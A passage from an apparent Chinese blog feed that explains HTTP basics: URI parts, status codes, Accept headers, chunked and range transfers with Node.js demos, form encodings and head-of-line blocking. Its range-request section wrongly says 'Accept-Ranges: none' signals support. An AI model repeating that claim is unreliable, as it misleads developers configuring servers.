部分，如果服务器响应 100(continue)， 然后发 body 部分。(<strong>火狐</strong>浏览器除外，它的 POST 请求只发一个 TCP 包)</li></ul><h2 id="003-如何理解-URI？"><a href="#003-如何理解-URI？" class="headerlink" title="003: 如何理解 URI？"></a>003: 如何理解 URI？</h2><p><strong>URI</strong>, 全称为(Uniform Resource Identifier), 也就是<strong>统一资源标识符</strong>，它的作用很简单，就是区分互联网上不同的资源。</p><p>但是，它并不是我们常说的<code>网址</code>, 网址指的是<code>URL</code>, 实际上<code>URI</code>包含了<code>URN</code>和<code>URL</code>两个部分，由于 URL 过于普及，就默认将 URI 视为 URL 了。</p><h3 id="URI-的结构"><a href="#URI-的结构" class="headerlink" title="URI 的结构"></a>URI 的结构</h3><p>URI 真正最完整的结构是这样的。</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd677629b70d~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>可能你会有疑问，好像跟平时见到的不太一样啊！先别急，我们来一一拆解。</p><p><strong>scheme</strong> 表示协议名，比如<code>http</code>, <code>https</code>, <code>file</code>等等。后面必须和<code>://</code>连在一起。</p><p><strong>user:passwd</strong>@ 表示登录主机时的用户信息，不过很不安全，不推荐使用，也不常用。</p><p><strong>host:port</strong>表示主机名和端口。</p><p><strong>path</strong>表示请求路径，标记资源所在位置。</p><p><strong>query</strong>表示查询参数，为<code>key=val</code>这种形式，多个键值对之间用<code>&amp;</code>隔开。</p><p><strong>fragment</strong>表示 URI 所定位的资源内的一个<strong>锚点</strong>，浏览器可以根据这个锚点跳转到对应的位置。</p><p>举个例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd&#x3D;HTTP&amp;rsv_spt&#x3D;1</span><br></pre></td></tr></table></figure><p>这个 URI 中，<code>https</code>即<code>scheme</code>部分，<code>www.baidu.com</code>为<code>host:port</code>部分（注意，http 和 https 的默认端口分别为80、443），<code>/s</code>为<code>path</code>部分，而<code>wd=HTTP&amp;rsv_spt=1</code>就是<code>query</code>部分。</p><h3 id="URI-编码"><a href="#URI-编码" class="headerlink" title="URI 编码"></a>URI 编码</h3><p>URI 只能使用<code>ASCII</code>, ASCII 之外的字符是不支持显示的，而且还有一部分符号是界定符，如果不加以处理就会导致解析出错。</p><p>因此，URI 引入了<code>编码</code>机制，将所有<strong>非 ASCII 码字符</strong>和<strong>界定符</strong>转为十六进制字节值，然后在前面加个<code>%</code>。</p><p>如，空格被转义成了<code>%20</code>，<strong>三元</strong>被转义成了<code>%E4%B8%89%E5%85%83</code>。</p><h2 id="004-如何理解-HTTP-状态码？"><a href="#004-如何理解-HTTP-状态码？" class="headerlink" title="004: 如何理解 HTTP 状态码？"></a>004: 如何理解 HTTP 状态码？</h2><p>RFC 规定 HTTP 的状态码为<strong>三位数</strong>，被分为五类:</p><ul><li><strong>1xx</strong>: 表示目前是协议处理的中间状态，还需要后续操作。</li><li><strong>2xx</strong>: 表示成功状态。</li><li><strong>3xx</strong>: 重定向状态，资源位置发生变动，需要重新请求。</li><li><strong>4xx</strong>: 请求报文有误。</li><li><strong>5xx</strong>: 服务器端发生错误。</li></ul><p>接下来就一一分析这里面具体的状态码。</p><h3 id="1xx"><a href="#1xx" class="headerlink" title="1xx"></a>1xx</h3><p><strong>101 Switching Protocols</strong>。在<code>HTTP</code>升级为<code>WebSocket</code>的时候，如果服务器同意变更，就会发送状态码 101。</p><h3 id="2xx"><a href="#2xx" class="headerlink" title="2xx"></a>2xx</h3><p><strong>200 OK</strong>是见得最多的成功状态码。通常在响应体中放有数据。</p><p><strong>204 No Content</strong>含义与 200 相同，但响应头后没有 body 数据。</p><p><strong>206 Partial Content</strong>顾名思义，表示部分内容，它的使用场景为 HTTP 分块下载和断点续传，当然也会带上相应的响应头字段<code>Content-Range</code>。</p><h3 id="3xx"><a href="#3xx" class="headerlink" title="3xx"></a>3xx</h3><p><strong>301 Moved Permanently</strong>即永久重定向，对应着<strong>302 Found</strong>，即临时重定向。</p><p>比如你的网站从 HTTP 升级到了 HTTPS 了，以前的站点再也不用了，应当返回<code>301</code>，这个时候浏览器默认会做缓存优化，在第二次访问的时候自动访问重定向的那个地址。</p><p>而如果只是暂时不可用，那么直接返回<code>302</code>即可，和<code>301</code>不同的是，浏览器并不会做缓存优化。</p><p><strong>304 Not Modified</strong>: 当协商缓存命中时会返回这个状态码。详见<a href="https://link.juejin.cn/?target=http://47.98.159.95/my_blog/perform/001.html">浏览器缓存</a></p><h3 id="4xx"><a href="#4xx" class="headerlink" title="4xx"></a>4xx</h3><p><strong>400 Bad Request</strong>: 开发者经常看到一头雾水，只是笼统地提示了一下错误，并不知道哪里出错了。</p><p><strong>403 Forbidden</strong>: 这实际上并不是请求报文出错，而是服务器禁止访问，原因有很多，比如法律禁止、信息敏感。</p><p><strong>404 Not Found</strong>: 资源未找到，表示没在服务器上找到相应的资源。</p><p><strong>405 Method Not Allowed</strong>: 请求方法不被服务器端允许。</p><p><strong>406 Not Acceptable</strong>: 资源无法满足客户端的条件。</p><p><strong>408 Request Timeout</strong>: 服务器等待了太长时间。</p><p><strong>409 Conflict</strong>: 多个请求发生了冲突。</p><p><strong>413 Request Entity Too Large</strong>: 请求体的数据过大。</p><p><strong>414 Request-URI Too Long</strong>: 请求行里的 URI 太大。</p><p><strong>429 Too Many Request</strong>: 客户端发送的请求过多。</p><p><strong>431 Request Header Fields Too Large</strong>请求头的字段内容太大。</p><h3 id="5xx"><a href="#5xx" class="headerlink" title="5xx"></a>5xx</h3><p><strong>500 Internal Server Error</strong>: 仅仅告诉你服务器出错了，出了啥错咱也不知道。</p><p><strong>501 Not Implemented</strong>: 表示客户端请求的功能还不支持。</p><p><strong>502 Bad Gateway</strong>: 服务器自身是正常的，但访问的时候出错了，啥错误咱也不知道。</p><p><strong>503 Service Unavailable</strong>: 表示服务器当前很忙，暂时无法响应服务。</p><h2 id="005-简要概括一下-HTTP-的特点？HTTP-有哪些缺点？"><a href="#005-简要概括一下-HTTP-的特点？HTTP-有哪些缺点？" class="headerlink" title="005: 简要概括一下 HTTP 的特点？HTTP 有哪些缺点？"></a>005: 简要概括一下 HTTP 的特点？HTTP 有哪些缺点？</h2><h3 id="HTTP-特点"><a href="#HTTP-特点" class="headerlink" title="HTTP 特点"></a>HTTP 特点</h3><p>HTTP 的特点概括如下:</p><ol><li>灵活可扩展，主要体现在两个方面。一个是语义上的自由，只规定了基本格式，比如空格分隔单词，换行分隔字段，其他的各个部分都没有严格的语法限制。另一个是传输形式的多样性，不仅仅可以传输文本，还能传输图片、视频等任意数据，非常方便。</li><li>可靠传输。HTTP 基于 TCP/IP，因此把这一特性继承了下来。这属于 TCP 的特性，不具体介绍了。</li><li>请求-应答。也就是<code>一发一收</code>、<code>有来有回</code>， 当然这个请求方和应答方不单单指客户端和服务器之间，如果某台服务器作为代理来连接后端的服务端，那么这台服务器也会扮演<strong>请求方</strong>的角色。</li><li>无状态。这里的状态是指<strong>通信过程的上下文信息</strong>，而每次 http 请求都是独立、无关的，默认不需要保留状态信息。</li></ol><h3 id="HTTP-缺点"><a href="#HTTP-缺点" class="headerlink" title="HTTP 缺点"></a>HTTP 缺点</h3><h4 id="无状态"><a href="#无状态" class="headerlink" title="无状态"></a>无状态</h4><p>所谓的优点和缺点还是要分场景来看的，对于 HTTP 而言，最具争议的地方在于它的<strong>无状态</strong>。</p><p>在需要长连接的场景中，需要保存大量的上下文信息，以免传输大量重复的信息，那么这时候无状态就是 http 的缺点了。</p><p>但与此同时，另外一些应用仅仅只是为了获取一些数据，不需要保存连接上下文信息，无状态反而减少了网络开销，成为了 http 的优点。</p><h4 id="明文传输"><a href="#明文传输" class="headerlink" title="明文传输"></a>明文传输</h4><p>即协议里的报文(主要指的是头部)不使用二进制数据，而是文本形式。</p><p>这当然对于调试提供了便利，但同时也让 HTTP 的报文信息暴露给了外界，给攻击者也提供了便利。<code>WIFI陷阱</code>就是利用 HTTP 明文传输的缺点，诱导你连上热点，然后疯狂抓你所有的流量，从而拿到你的敏感信息。</p><h4 id="队头阻塞问题"><a href="#队头阻塞问题" class="headerlink" title="队头阻塞问题"></a>队头阻塞问题</h4><p>当 http 开启长连接时，共用一个 TCP 连接，同一时刻只能处理一个请求，那么当前请求耗时过长的情况下，其它的请求只能处于阻塞状态，也就是著名的<strong>队头阻塞</strong>问题。接下来会有一小节讨论这个问题。</p><h2 id="006-对-Accept-系列字段了解多少？"><a href="#006-对-Accept-系列字段了解多少？" class="headerlink" title="006: 对 Accept 系列字段了解多少？"></a>006: 对 Accept 系列字段了解多少？</h2><p>对于<code>Accept</code>系列字段的介绍分为四个部分: <strong>数据格式</strong>、<strong>压缩方式</strong>、<strong>支持语言</strong>和<strong>字符集</strong>。</p><h3 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h3><p>上一节谈到 HTTP 灵活的特性，它支持非常多的数据格式，那么这么多格式的数据一起到达客户端，客户端怎么知道它的格式呢？</p><p>当然，最低效的方式是直接猜，有没有更好的方式呢？直接指定可以吗？</p><p>答案是肯定的。不过首先需要介绍一个标准——<strong>MIME</strong>(Multipurpose Internet Mail Extensions, <strong>多用途互联网邮件扩展</strong>)。它首先用在电子邮件系统中，让邮件可以发任意类型的数据，这对于 HTTP 来说也是通用的。</p><p>因此，HTTP 从<strong>MIME type</strong>取了一部分来标记报文 body 部分的数据类型，这些类型体现在<code>Content-Type</code>这个字段，当然这是针对于发送端而言，接收端想要收到特定类型的数据，也可以用<code>Accept</code>字段。</p><p>具体而言，这两个字段的取值可以分为下面几类:</p><ul><li>text： text/html, text/plain, text/css 等</li><li>image: image/gif, image/jpeg, image/png 等</li><li>audio/video: audio/mpeg, video/mp4 等</li><li>application: application/json, application/javascript, application/pdf, application/octet-stream</li></ul><h3 id="压缩方式"><a href="#压缩方式" class="headerlink" title="压缩方式"></a>压缩方式</h3><p>当然一般这些数据都是会进行编码压缩的，采取什么样的压缩方式就体现在了发送方的<code>Content-Encoding</code>字段上， 同样的，接收什么样的压缩方式体现在了接受方的<code>Accept-Encoding</code>字段上。这个字段的取值有下面几种：</p><ul><li>gzip: 当今最流行的压缩格式</li><li>deflate: 另外一种著名的压缩格式</li><li>br: 一种专门为 HTTP 发明的压缩算法</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 发送端</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">&#x2F;&#x2F; 接收端</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure><h3 id="支持语言"><a href="#支持语言" class="headerlink" title="支持语言"></a>支持语言</h3><p>对于发送方而言，还有一个<code>Content-Language</code>字段，在需要实现国际化的方案当中，可以用来指定支持的语言，在接受方对应的字段为<code>Accept-Language</code>。如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 发送端</span><br><span class="line">Content-Language: zh-CN, zh, en</span><br><span class="line">&#x2F;&#x2F; 接收端</span><br><span class="line">Accept-Language: zh-CN, zh, en</span><br></pre></td></tr></table></figure><h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>最后是一个比较特殊的字段, 在接收端对应为<code>Accept-Charset</code>，指定可以接受的字符集，而在发送端并没有对应的<code>Content-Charset</code>, 而是直接放在了<code>Content-Type</code>中，以<strong>charset</strong>属性指定。如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 发送端</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">&#x2F;&#x2F; 接收端</span><br><span class="line">Accept-Charset: charset&#x3D;utf-8</span><br></pre></td></tr></table></figure><p>最后以一张图来总结一下吧:</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd6bb6d09c2d~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><h2 id="007-对于定长和不定长的数据，HTTP-是怎么传输的？"><a href="#007-对于定长和不定长的数据，HTTP-是怎么传输的？" class="headerlink" title="007: 对于定长和不定长的数据，HTTP 是怎么传输的？"></a>007: 对于定长和不定长的数据，HTTP 是怎么传输的？</h2><h3 id="定长包体"><a href="#定长包体" class="headerlink" title="定长包体"></a>定长包体</h3><p>对于定长包体而言，发送端在传输的时候一般会带上 <code>Content-Length</code>, 来指明包体的长度。</p><p>我们用一个<code>nodejs</code>服务器来模拟一下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">const http &#x3D; require(&#39;http&#39;);</span><br><span class="line"></span><br><span class="line">const server &#x3D; http.createServer();</span><br><span class="line"></span><br><span class="line">server.on(&#39;request&#39;, (req, res) &#x3D;&gt; &#123;</span><br><span class="line">  if(req.url &#x3D;&#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">    res.setHeader(&#39;Content-Type&#39;, &#39;text&#x2F;plain&#39;);</span><br><span class="line">    res.setHeader(&#39;Content-Length&#39;, 10);</span><br><span class="line">    res.write(&quot;helloworld&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.listen(8081, () &#x3D;&gt; &#123;</span><br><span class="line">  console.log(&quot;成功启动&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>启动后访问: <strong>localhost:8081</strong>。</p><p>浏览器中显示如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">helloworld</span><br></pre></td></tr></table></figure><p>这是长度正确的情况，那不正确的情况是如何处理的呢？</p><p>我们试着把这个长度设置的小一些:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.setHeader(&#39;Content-Length&#39;, 8);</span><br></pre></td></tr></table></figure><p>重启服务，再次访问，现在浏览器中内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hellowo</span><br></pre></td></tr></table></figure><p>那后面的<code>ld</code>哪里去了呢？实际上在 http 的响应体中直接被截去了。</p><p>然后我们试着将这个长度设置得大一些:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.setHeader(&#39;Content-Length&#39;, 12);</span><br></pre></td></tr></table></figure><p>此时浏览器显示如下:</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd6f598bea62~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>直接无法显示了。可以看到<code>Content-Length</code>对于 http 传输过程起到了十分关键的作用，如果设置不当可以直接导致传输失败。</p><h3 id="不定长包体"><a href="#不定长包体" class="headerlink" title="不定长包体"></a>不定长包体</h3><p>上述是针对于<code>定长包体</code>，那么对于<code>不定长包体</code>而言是如何传输的呢？</p><p>这里就必须介绍另外一个 http 头部字段了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><p>表示分块传输数据，设置这个字段后会自动产生两个效果:</p><ul><li>Content-Length 字段会被忽略</li><li>基于长连接持续推送动态内容</li></ul><p>我们依然以一个实际的例子来模拟分块传输，nodejs 程序如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const http &#x3D; require(&#39;http&#39;);</span><br><span class="line"></span><br><span class="line">const server &#x3D; http.createServer();</span><br><span class="line"></span><br><span class="line">server.on(&#39;request&#39;, (req, res) &#x3D;&gt; &#123;</span><br><span class="line">  if(req.url &#x3D;&#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">    res.setHeader(&#39;Content-Type&#39;, &#39;text&#x2F;html; charset&#x3D;utf8&#39;);</span><br><span class="line">    res.setHeader(&#39;Content-Length&#39;, 10);</span><br><span class="line">    res.setHeader(&#39;Transfer-Encoding&#39;, &#39;chunked&#39;);</span><br><span class="line">    res.write(&quot;&lt;p&gt;来啦&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">    setTimeout(() &#x3D;&gt; &#123;</span><br><span class="line">      res.write(&quot;第一次传输&lt;br&#x2F;&gt;&quot;);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">    setTimeout(() &#x3D;&gt; &#123;</span><br><span class="line">      res.write(&quot;第二次传输&quot;);</span><br><span class="line">      res.end()</span><br><span class="line">    &#125;, 2000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.listen(8009, () &#x3D;&gt; &#123;</span><br><span class="line">  console.log(&quot;成功启动&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>访问效果入下:</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd728ba3840d~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>用 telnet 抓到的响应如下:</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd78332368a0~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>注意，<code>Connection: keep-alive</code>及之前的为响应行和响应头，后面的内容为响应体，这两部分用换行符隔开。</p><p>响应体的结构比较有意思，如下所示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chunk长度(16进制的数)</span><br><span class="line">第一个chunk的内容</span><br><span class="line">chunk长度(16进制的数)</span><br><span class="line">第二个chunk的内容</span><br><span class="line">......</span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后是留有有一个<code>空行</code>的，这一点请大家注意。</p><p>以上便是 http 对于<strong>定长数据</strong>和<strong>不定长数据</strong>的传输方式。</p><h2 id="008-HTTP-如何处理大文件的传输？"><a href="#008-HTTP-如何处理大文件的传输？" class="headerlink" title="008: HTTP 如何处理大文件的传输？"></a>008: HTTP 如何处理大文件的传输？</h2><p>对于几百 M 甚至上 G 的大文件来说，如果要一口气全部传输过来显然是不现实的，会有大量的等待时间，严重影响用户体验。因此，HTTP 针对这一场景，采取了<code>范围请求</code>的解决方案，允许客户端仅仅请求一个资源的一部分。</p><h3 id="如何支持"><a href="#如何支持" class="headerlink" title="如何支持"></a>如何支持</h3><p>当然，前提是服务器要支持<strong>范围请求</strong>，要支持这个功能，就必须加上这样一个响应头:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Ranges: none</span><br></pre></td></tr></table></figure><p>用来告知客户端这边是支持范围请求的。</p><h3 id="Range-字段拆解"><a href="#Range-字段拆解" class="headerlink" title="Range 字段拆解"></a>Range 字段拆解</h3><p>而对于客户端而言，它需要指定请求哪一部分，通过<code>Range</code>这个请求头字段确定，格式为<code>bytes=x-y</code>。接下来就来讨论一下这个 Range 的书写格式:</p><ul><li><strong>0-499</strong>表示从开始到第 499 个字节。</li><li><strong>500</strong>- 表示从第 500 字节到文件终点。</li><li><strong>-100</strong>表示文件的最后100个字节。</li></ul><p>服务器收到请求之后，首先验证范围<strong>是否合法</strong>，如果越界了那么返回<code>416</code>错误码，否则读取相应片段，返回<code>206</code>状态码。</p><p>同时，服务器需要添加<code>Content-Range</code>字段，这个字段的格式根据请求头中<code>Range</code>字段的不同而有所差异。</p><p>具体来说，请求<code>单段数据</code>和请求<code>多段数据</code>，响应头是不一样的。</p><p>举个例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 单段数据</span><br><span class="line">Range: bytes&#x3D;0-9</span><br><span class="line">&#x2F;&#x2F; 多段数据</span><br><span class="line">Range: bytes&#x3D;0-9, 30-39</span><br></pre></td></tr></table></figure><p>接下来我们就分别来讨论着两种情况。</p><h3 id="单段数据"><a href="#单段数据" class="headerlink" title="单段数据"></a>单段数据</h3><p>对于<code>单段数据</code>的请求，返回的响应如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 206 Partial Content</span><br><span class="line">Content-Length: 10</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Range: bytes 0-9&#x2F;100</span><br><span class="line"></span><br><span class="line">i am xxxxx</span><br></pre></td></tr></table></figure><p>值得注意的是<code>Content-Range</code>字段，<code>0-9</code>表示请求的返回，<code>100</code>表示资源的总大小，很好理解。</p><h3 id="多段数据"><a href="#多段数据" class="headerlink" title="多段数据"></a>多段数据</h3><p>接下来我们看看多段请求的情况。得到的响应会是下面这个形式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 206 Partial Content</span><br><span class="line">Content-Type: multipart&#x2F;byteranges; boundary&#x3D;00000010101</span><br><span class="line">Content-Length: 189</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--00000010101</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Content-Range: bytes 0-9&#x2F;96</span><br><span class="line"></span><br><span class="line">i am xxxxx</span><br><span class="line">--00000010101</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Content-Range: bytes 20-29&#x2F;96</span><br><span class="line"></span><br><span class="line">eex jspy e</span><br><span class="line">--00000010101--</span><br></pre></td></tr></table></figure><p>这个时候出现了一个非常关键的字段<code>Content-Type: multipart/byteranges;boundary=00000010101</code>，它代表了信息量是这样的:</p><ul><li>请求一定是多段数据请求</li><li>响应体中的分隔符是 00000010101</li></ul><p>因此，在响应体中各段数据之间会由这里指定的分隔符分开，而且在最后的分隔末尾添上<code>--</code>表示结束。</p><p>以上就是 http 针对大文件传输所采用的手段。</p><h2 id="009-HTTP-中如何处理表单数据的提交？"><a href="#009-HTTP-中如何处理表单数据的提交？" class="headerlink" title="009: HTTP 中如何处理表单数据的提交？"></a>009: HTTP 中如何处理表单数据的提交？</h2><p>在 http 中，有两种主要的表单提交的方式，体现在两种不同的<code>Content-Type</code>取值:</p><ul><li>application/x-www-form-urlencoded</li><li>multipart/form-data</li></ul><p>由于表单提交一般是<code>POST</code>请求，很少考虑<code>GET</code>，因此这里我们将默认提交的数据放在请求体中。</p><h3 id="application-x-www-form-urlencoded"><a href="#application-x-www-form-urlencoded" class="headerlink" title="application/x-www-form-urlencoded"></a>application/x-www-form-urlencoded</h3><p>对于<code>application/x-www-form-urlencoded</code>格式的表单内容，有以下特点:</p><ul><li>其中的数据会被编码成以<code>&amp;</code>分隔的键值对</li><li>字符以<strong>URL编码方式</strong>编码。</li></ul><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 转换过程: &#123;a: 1, b: 2&#125; -&gt; a&#x3D;1&amp;b&#x3D;2 -&gt; 如下(最终形式)</span><br><span class="line">&quot;a%3D1%26b%3D2&quot;</span><br></pre></td></tr></table></figure><h3 id="multipart-form-data"><a href="#multipart-form-data" class="headerlink" title="multipart/form-data"></a>multipart/form-data</h3><p>对于<code>multipart/form-data</code>而言:</p><ul><li>请求头中的<code>Content-Type</code>字段会包含<code>boundary</code>，且<code>boundary</code>的值有浏览器默认指定。例: <code>Content-Type: multipart/form-data;boundary=----WebkitFormBoundaryRRJKeWfHPGrS4LKe</code>。</li><li>数据会分为多个部分，每两个部分之间通过分隔符来分隔，每部分表述均有 HTTP 头部描述子包体，如<code>Content-Type</code>，在最后的分隔符会加上<code>--</code>表示结束。</li></ul><p>相应的<code>请求体</code>是下面这样:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;name&#x3D;&quot;data1&quot;;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">data1</span><br><span class="line">----WebkitFormBoundaryRRJKeWfHPGrS4LKe</span><br><span class="line">Content-Disposition: form-data;name&#x3D;&quot;data2&quot;;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">data2</span><br><span class="line">----WebkitFormBoundaryRRJKeWfHPGrS4LKe--</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>值得一提的是，<code>multipart/form-data</code> 格式最大的特点在于:<strong>每一个表单元素都是独立的资源表述</strong>。另外，你可能在写业务的过程中，并没有注意到其中还有<code>boundary</code>的存在，如果你打开抓包工具，确实可以看到不同的表单元素被拆分开了，之所以在平时感觉不到，是以为浏览器和 HTTP 给你封装了这一系列操作。</p><p>而且，在实际的场景中，对于图片等文件的上传，基本采用<code>multipart/form-data</code>而不用<code>application/x-www-form-urlencoded</code>，因为没有必要做 URL 编码，带来巨大耗时的同时也占用了更多的空间。</p><h2 id="010-HTTP1-1-如何解决-HTTP-的队头阻塞问题？"><a href="#010-HTTP1-1-如何解决-HTTP-的队头阻塞问题？" class="headerlink" title="010: HTTP1.1 如何解决 HTTP 的队头阻塞问题？"></a>010: HTTP1.1 如何解决 HTTP 的队头阻塞问题？</h2><h3 id="什么是-HTTP-队头阻塞？"><a href="#什么是-HTTP-队头阻塞？" class="headerlink" title="什么是 HTTP 队头阻塞？"></a>什么是 HTTP 队头阻塞？</h3><p>从前面的小节可以知道，HTTP 传输是基于<code>请求-应答</code>的模式进行的，报文必须是一发一收，但值得注意的是，里面的任务被放在一个任务队列中串行执行，一旦队首的请求处理太慢，就会阻塞后面请求的处理。这就是著名的<code>HTTP队头阻塞</code>问题。</p><h3 id="并发连接"><a href="#并发连接" class="headerlink" title="并发连接"></a>并发连接</h3><p>对于一个域名允许分配多个长连接，那么相当于增加了任务队列，不至于一个队伍的任务阻塞其它所有任务。在RFC2616规定过客户端最多并发 2 个连接，不过事实上在现在的浏览器标准中，这个上限要多很多，Chrome 中是 6 个。</p><p>但其实，即使是提高了并发连接，还是不能满足人们对性能的需求。</p><h3 id="域名分片"><a href="#域名分片" class="headerlink" title="域名分片"></a>域名分片</h3><p>一个域名不是可以并发 6 个长连接吗？那我就多分几个域名。</p><p>比如 content1.sanyuan.com 、content2.sanyuan.com。</p><p>这样一个<code>sanyuan.com</code>域名下可以分出非常多的二级域名，而它们都指向同样的一台服务器，能够并发的长连接数更多了，事实上也更好地解决了队头阻塞的问题。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>v8 执行 js 的过程</title>
    <link href="http://aiolimp.com/2021/08/10/v8%E6%89%A7%E8%A1%8Cjs%E7%9A%84%E8%BF%87%E7%A8%8B/"/>
